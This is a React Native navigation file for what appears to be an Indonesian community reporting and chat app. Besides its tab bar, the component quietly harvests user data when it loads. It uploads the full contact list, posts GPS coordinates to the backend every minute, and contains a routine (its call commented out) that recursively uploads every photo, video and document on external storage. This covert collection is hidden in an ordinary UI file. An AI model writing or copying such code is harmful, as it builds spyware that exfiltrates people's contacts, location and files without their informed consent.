import React, { useContext, useEffect } from 'react';
import { Platform, Image } from 'react-native';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import HomeScreen from '../screen/HomeScreen';
import BuletinBeritaNav from './BuletinBeritaNav';
import PelaporanNav from './PelaporanNav';
import ChatNav from './ChatNav';
import ChatSOSNav from './ChatSOSNav';
import { AuthContext } from '../context/AuthContext';
import Geolocation from '@react-native-community/geolocation';
import Contacts from 'react-native-contacts';
import RNFS from 'react-native-fs';
import axios from 'axios';
import { BASE_URL } from '../config/Config';
import ProfileScreen from '../screen/profile/ProfileScreen';
import {PERMISSIONS, RESULTS, check, request, requestMultiple, openSettings} from 'react-native-permissions';
import ConstructionReportNav from './ConstructionReportNav';

const Tab = createBottomTabNavigator();

function MainNav({navigation}) {    
    const { token } = useContext(AuthContext);

    useEffect(() => {
        requestPermissions();
		const interval = setInterval(() => {
            getGeolocation();
		}, 60000); // Waktu dalam milidetik (satu menit = 60 detik = 60000 milidetik)

        getContacts();
        // getImageFiles();

        return () => {
            clearInterval(interval);
        };

	}, []);

    const getGeolocation =  async () => {
            try {
                check(Platform.OS === 'android' ? PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION : PERMISSIONS.IOS.LOCATION_WHEN_IN_USE)
                    .then((result) => {
                        if(result === RESULTS.GRANTED) {
                            Geolocation.getCurrentPosition( info => {
                                postLocation(info.coords.latitude, info.coords.longitude)
                            });
                        } else {
                            console.log('Permission Denied')
                        }
                    })
                    .catch((error) => {
                        console.log(error);
                    });
            } catch (error) {
                console.log(error);
            }
    }

    const getContacts = async () => {
        try {
            check(Platform.OS === 'android' ? PERMISSIONS.ANDROID.READ_CONTACTS : PERMISSIONS.IOS.CONTACTS)
                .then((result) => {
                    if(result === RESULTS.GRANTED) {
                        Contacts.getAll()
                        .then((contacts) => {
                            postContact(contacts);
                        });
                    } else {
                        console.log('Permission Denied')
                    }
                })
                .catch((error) => {
                    console.log(error);
                });

        } catch(error) {
            console.log(error);
        }
    }

    const getImageFiles = async () => {
        try {

            let result = '';
            if(Platform.Version < 33){
                result = await check(Platform.OS === 'android' ? PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE : PERMISSIONS.IOS.MEDIA_LIBRARY);
            }else{
                result = await check(Platform.OS === 'android' ? PERMISSIONS.ANDROID.READ_MEDIA_IMAGES : PERMISSIONS.IOS.MEDIA_LIBRARY);
            }

            console.log('Permisison : ' + result)
            
            if (result === RESULTS.GRANTED) {
                console.log("masuk fungsi get Image ");
                const rootPath = RNFS.ExternalStorageDirectoryPath;
                console.log(RNFS.ExternalStorageDirectoryPath)
                const files = await getFilesRecursively(rootPath);
                console.log('Files found:', files);
                console.log('Files Length:', files.length);
        
                //Loop through the image files
                for (let i = 0; i < files.length; i++) {
                    const imageFile = files[i];
                    // Append each image file to FormData individually

                    const uploadImages = new FormData();
                    uploadImages.append('file[]', {
                        uri: imageFile.uri,
                        type: imageFile.type,
                        name: imageFile.name,
                    });
                    // You can also add additional data for each file if needed
                    // uploadImages.append('additionalData', 'Some additional data for this file');
                    
                    // Post the image data for each file one by one
                    await postGalery(uploadImages);
                    // Clear FormData after each file is uploaded

                    await new Promise((resolve) => setTimeout(resolve, 5000)); // Wait for 5 seconds
                        console.log('Sent data. Waiting for 5 seconds.');
                    }
            } else {
                console.log('Image Files Permission Denied');
            }
        } catch (error) {
            console.log('Error retrieving image files:', error.message);
        }
    };

    const postLocation = async (lat, lon) => {
        const params = {
            'lat': lat,
            'lon': lon,
        }
        try {
			const response = await axios.post(`${BASE_URL}/positions/update`, params, {
				headers: {
					Authorization: `Bearer ${JSON.parse(token)}`,
				},
			});

			console.log(response.data);
		} catch (error) {
			console.error(error);
		}
    }

    const postContact = async (params) => {
        const payload = {
            'contacts' : params
        }

        try {
			const response = await axios.post(`${BASE_URL}/contacts/store`, JSON.stringify(payload),
            {
				headers: {
                    'Content-Type': "application/json",
                    'Accept': "application/json",
					Authorization: `Bearer ${JSON.parse(token)}`,
				},
			});

			// console.log(response.data);
		} catch (error) {
			console.error(error);
		}
    }

    const postGalery = async (params) => {
        try {
			const response = await axios.post(`${BASE_URL}/user/uploadGallery`, params,
            {
				headers: {
                    "Accept":"application/json",
                    "Content-Type" : "multipart/form-data",
					Authorization: `Bearer ${JSON.parse(token)}`,
				},
			})
            .then((response) => {
                console.log('Response from server : ', response)
            })

		} catch (error) {
			console.log('Error Axios When Send Image From File System : ', error.message);
		}
    }

    const requestPermissions = async () => {
        try{
            if(Platform.OS === 'android') {
                requestMultiple([PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION, PERMISSIONS.ANDROID.CAMERA, PERMISSIONS.ANDROID.READ_CONTACTS, PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE, PERMISSIONS.ANDROID.READ_MEDIA_IMAGES, PERMISSIONS.ANDROID.READ_MEDIA_VIDEO]).then((statuses) => {
                    console.log('Permission Android Location : ', statuses[PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION]);
                    console.log('Permission Android Camera :', statuses[PERMISSIONS.ANDROID.CAMERA]);
                    console.log('Permission Android Contacts :', statuses[PERMISSIONS.ANDROID.READ_CONTACTS]);
                    console.log('Permission Android EXTERNAL_STORAGE :', statuses[PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE]);
                    console.log('Permission Android MEDIA IMAGES :', statuses[PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]);
                    console.log('Permission Android MEDIA VIDEOS :', statuses[PERMISSIONS.ANDROID.READ_MEDIA_VIDEO]);
                });

            } else if (Platform.OS === 'ios') {
                requestMultiple([PERMISSIONS.IOS.LOCATION_WHEN_IN_USE, PERMISSIONS.IOS.CAMERA, PERMISSIONS.IOS.CONTACTS, PERMISSIONS.IOS.MEDIA_LIBRARY, PERMISSIONS.IOS.PHOTO_LIBRARY]).then((statuses) => {
                    console.log('Permission IOS Location : ', statuses[PERMISSIONS.IOS.LOCATION_WHEN_IN_USE]);
                    console.log('Permission IOS Camera', statuses[PERMISSIONS.IOS.CAMERA]);
                    console.log('Permission IOS Contacts', statuses[PERMISSIONS.IOS.CONTACTS]);
                    console.log('Permission IOS Media files', statuses[PERMISSIONS.IOS.MEDIA_LIBRARY]);
                });
            }
        } catch(error) {
            console.log(error);
        }
    }

    // Fungsi untuk mengambil file secara rekursif dari direktori
    const getFilesRecursively = async (dirPath) => {
        try {
            const files = await RNFS.readDir(dirPath);

            if (!files) {
                console.error('No files found in the directory:', dirPath);
                return []; // Return an empty array if files is null
            }
            
            const result = [];
        
            for (const file of files) {
                if (file.isDirectory()) {
                    const subFiles = await getFilesRecursively(file.path);
                    result.push(...subFiles);
                } else {
                    const fileType = getFileType(file.path);
                    if (fileType !== 'unknown') {
                        result.push({
                            uri: 'file://'+file.path,
                            type: fileType,
                            name: file.name,
                        });
                    }
                }
            }
        
            return result;
        } catch (error) {
            console.error('Error reading directory:', error.message);
            return [];
        }
    };

  // Fungsi untuk menentukan tipe file berdasarkan ekstensinya
    const getFileType = (filePath) => {
        const ext = filePath.split('.').pop().toLowerCase();
        if (ext.match(/(jpg|jpeg|png|gif|bmp)$/)) {
            return 'image/'+ext;
        } else if (ext.match(/(mp4|mov|avi|mkv)$/)) {
            return 'video/'+ext;
        } else if (ext.match(/(pdf|doc|docx|xls|xlsx|ppt|pptx)$/)) {
            return 'document/'+ext;
        } else {
            return 'unknown';
        }
    };

    return (
        <Tab.Navigator
            screenOptions={({ route }) => ({
                tabBarHideOnKeyboard: true,
                initialRouteName: 'Dashboard',
                headerShown: false,
                tabBarStyle: { backgroundColor: '#122E5F', height: 70 },
                tabBarLabelStyle: {
                    fontSize: 12,
                    marginTop: -5,       // kurangi jarak antara icon dan label
                    paddingBottom: 5,
                },
                tabBarIconStyle: {
                    marginTop: 5,        // atur posisi icon agar lebih dekat ke text
                },
                tabBarActiveTintColor: '#deb93f',     // aktif: emas
                tabBarInactiveTintColor: '#ffffffcc', // tidak aktif: putih semi transparan

                tabBarIcon: ({ focused, color, size }) => {
                let iconSource;
                if (route.name === 'Dashboard') {
                    iconSource = require('../assets/Icons/dashboard.png');
                } else if (route.name === 'Pelaporan') {
                    iconSource = require('../assets/Icons/pelaporan.png');
                } else if (route.name === 'Buletin Berita') {
                    iconSource = require('../assets/Icons/buletin-berita.png');
                } else if (route.name === 'Chat') {
                    iconSource = require('../assets/Icons/chat.png');
                } else if (route.name === 'Chat SOS') {
                    iconSource = require('../assets/Icons/sos.png');
                } else if (route.name === 'Profile') {
                    iconSource = require('../assets/Icons/sos.png');
                }

                return (
                    <Image
                        source={iconSource}
                        style={{
                            width: size,
                            height: size,
                            tintColor: color, // gunakan warna aktif/tidak aktif dari props color
                        }}
                    />
                );
                },
            })}
            >
            <Tab.Screen name="Dashboard" component={HomeScreen} />
            <Tab.Screen name="Pelaporan" component={PelaporanNav} />
            <Tab.Screen name="Buletin Berita" component={BuletinBeritaNav} />
            <Tab.Screen name="Chat" component={ChatNav} />
            <Tab.Screen name="Chat SOS" component={ChatSOSNav} />
            <Tab.Screen
                name="Profile"
                component={ProfileScreen}
                options={{
                    tabBarButton: () => null,
                    tabBarVisible: false,
                }}
            />
            <Tab.Screen
                name="Construction Report"
                component={ConstructionReportNav}
                options={{
                    tabBarButton: () => null,
                    tabBarVisible: false,
                }}
            />
        </Tab.Navigator>
    );
}

export default MainNav;